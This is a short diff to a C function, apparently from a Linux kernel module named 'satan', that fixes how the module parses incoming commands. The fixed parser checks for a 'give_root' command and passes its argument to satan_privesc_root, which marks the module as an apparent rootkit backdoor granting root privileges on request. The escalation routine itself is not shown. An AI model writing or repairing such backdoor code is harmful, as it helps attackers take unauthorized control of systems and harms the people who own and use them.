@@ -28,19 +28,21 @@ int satan_command_parse(const char *cmd)
 
         arg = strnchr(buf, CMD_BUF_SIZE - 1, ' ');
         
-        if (arg)
-                *arg++ = 0;  
+        if (arg) {
+                *arg = 0;
+                arg++;
+        }
        
 
-        pr_info("satan: command: received (%s,%s)\n", cmd, arg);
+        pr_info("satan: command: received (%s,%s)\n", buf, arg);
 
         // At this point:
         // 1. `buf` points to the command string.
         // 2. `arg` points to the argument string.
-        if (!strncmp(cmd, "give_root", CMD_BUF_SIZE - 1)) {
+        if (!strncmp(buf, "give_root", CMD_BUF_SIZE - 1)) {
                 satan_privesc_root(arg);
         } else {
-                pr_info("satan: unknown command: %s\n", cmd);
+                pr_info("satan: unknown command: %s\n", buf);
                 ret = 1;
         }
 
